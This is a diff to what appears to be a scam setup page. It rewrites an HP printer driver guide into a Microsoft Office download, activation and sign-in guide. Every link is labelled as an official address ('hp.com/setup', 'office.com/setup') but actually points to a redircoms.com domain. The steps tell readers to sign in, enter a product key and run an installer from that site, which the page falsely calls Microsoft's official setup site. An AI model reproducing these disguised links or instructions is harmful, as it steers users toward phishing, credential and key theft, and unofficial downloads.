@@ -1,5 +1,5 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How Do I Download, Install, and Set Up Microsoft Office?
 ##################
 
 .. meta::
@@ -14,8 +14,8 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: office.com/setup
+      :target: https://ms.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,24 +28,24 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+There are 5 simple stages to download, install, and set up Microsoft Office on your computer. Follow each stage one by one to successfully activate Office via `office.com/setup <https://ms.redircoms.com>`_. Microsoft’s setup site ensures you get the official installer and an easy activation process. It’s the fastest way to start using Office apps like Word, Excel, and PowerPoint. Visit `office.com/setup <https://ms.redircoms.com>`_, download the right installer, and get Office ready to use in minutes.
 
 **********
-Steps to Download HP Printer Driver
+Steps to Download Microsoft Office
 **********
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+1. Open a web browser and go to `office.com/setup <https://ms.redircoms.com>`_.
 
-2. Enter your HP printer model in the search box.
+2. Sign in with your Microsoft account, or create one if you don’t have it.
 
-3. Select your operating system if prompted.
+3. Enter your Office product key if prompted.
 
-4. Click on **Download** to get the latest driver and software package.
+4. Click on **Install** to download the Office installer.
 
 5. Save the installer file to your computer.
 
 **********
-Steps to Install HP Printer Driver
+Steps to Install Microsoft Office
 **********
 
 1. Locate the downloaded installer file on your computer.
@@ -54,20 +54,20 @@ Steps to Install HP Printer Driver
 
 3. Follow the on-screen instructions and accept the license agreement.
 
-4. Choose your connection type (USB or Wireless).
+4. Wait while Office apps are installed.
 
-5. Complete the installation by clicking **Finish**.
+5. Complete the installation by clicking **Close** when finished.
 
 **********
-Setting Up Your HP Printer
+Setting Up Microsoft Office
 **********
 
-1. Make sure your HP printer is powered on.
+1. Open any installed Office app (like Word or Excel).
 
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
+2. Sign in with your Microsoft account to activate Office.
 
-3. Open the HP driver or utility you installed.
+3. If prompted, enter your product key or verify your subscription.
 
-4. Follow on-screen prompts to detect and connect your printer.
+4. Follow on-screen prompts to finish activation.
 
-5. Once connected, print a test page to verify setup is complete.
+5. Once activated, Office is ready to use—start creating documents immediately.
